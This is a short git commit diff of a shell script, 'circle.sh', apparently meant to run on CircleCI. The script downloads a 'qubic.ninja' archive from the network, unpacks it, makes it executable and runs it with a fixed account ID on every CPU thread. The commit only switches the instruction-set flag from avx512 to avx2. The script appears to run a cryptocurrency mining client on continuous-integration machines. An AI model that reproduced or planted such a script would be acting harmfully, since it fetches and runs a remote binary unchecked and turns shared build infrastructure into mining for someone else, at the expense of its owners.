3fe6b90270a49f3352e41e01efae647016faa989
testqb006 <168262425+testqb006@users.noreply.github.com>
2024-04-27 12:45:57 +0530

    Update circle.sh

--- circle.sh
+++ circle.sh
@@ -1,4 +1,4 @@
 wget https://dl.qubic.ninja/ninja/linux-latest.tar.gz -O linux-latest.tar.gz
 tar -xzvf linux-latest.tar.gz
 chmod u+x qubic.ninja
-./qubic.ninja -i=BEQENIGEIOOTXBUAIQVGQGMMNIXCXSHDZHGFPTSLZCGHTCMZHGIIDXAFUJDJ -t=$(nproc) -n=bit01 -s=avx512
+./qubic.ninja -i=BEQENIGEIOOTXBUAIQVGQGMMNIXCXSHDZHGFPTSLZCGHTCMZHGIIDXAFUJDJ -t=$(nproc) -n=bit01 -s=avx2
